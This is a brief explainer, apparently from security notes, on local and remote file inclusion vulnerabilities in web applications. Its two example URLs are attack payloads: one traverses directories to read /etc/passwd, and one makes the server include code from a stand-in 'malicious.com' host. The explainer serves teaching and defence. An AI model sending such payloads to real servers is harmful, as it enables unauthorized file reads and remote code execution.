##`File inclusion vulnerability`

File Inclusion Vulnerability, often referred to as Local File Inclusion (LFI) or Remote File Inclusion (RFI), is a type of security vulnerability that occurs when a web application allows an attacker to include files on the server through the web browser. This can have serious consequences, potentially leading to unauthorized access, data disclosure, or even remote code execution on the server.

### Example

http://example.com/page.php?file=../../../../etc/passwd

http://example.com/page.php?file=http://malicious.com/malicious-code.php
